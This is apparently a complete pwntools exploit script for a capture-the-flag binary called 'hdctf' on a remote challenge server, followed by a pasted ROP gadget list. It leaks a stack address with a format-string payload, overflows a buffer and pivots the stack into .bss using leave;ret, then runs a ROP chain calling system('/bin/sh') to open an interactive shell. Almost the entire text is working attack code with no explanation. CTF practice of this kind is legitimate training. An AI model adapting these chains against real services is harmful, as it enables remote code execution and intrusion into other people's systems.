from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


# io=process("./hdctf")
io=remote("node4.anna.nssctf.cn",28624)
elf=ELF("./hdctf")

read_text=0x4007D7
leave_ret=0x4007f2
pop_rdi_ret=0x4008d3
bss_addr=0x601800
main=0x400746
ret=0x4005b9

# gdb.attach(io)
# pause()

io.recvuntil(b"name: \n")
io.send(b"%1$paaa./bin/sh\x00")

io.recvuntil(b",")
sh=int(io.recv(14),16)+0x12
print("sh: "+hex(sh))

io.recvuntil(b"keep on !\n")
payload=cyclic(0x50)+p64(0x601900)+p64(read_text)
io.send(payload)
payload=p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(sh)+p64(elf.sym[b"system"])
payload=payload.ljust(0x50,b"a")+p64(0x601900-0x50)+p64(leave_ret)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x00000000004007f2 : leave ; ret
# 0x00000000004008cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008d0 : pop r14 ; pop r15 ; ret
# 0x00000000004008d2 : pop r15 ; ret
# 0x00000000004008cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006b0 : pop rbp ; ret
# 0x00000000004008d3 : pop rdi ; ret
# 0x00000000004008d1 : pop rsi ; pop r15 ; ret
# 0x00000000004008cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005b9 : ret

# Unique gadgets found: 12
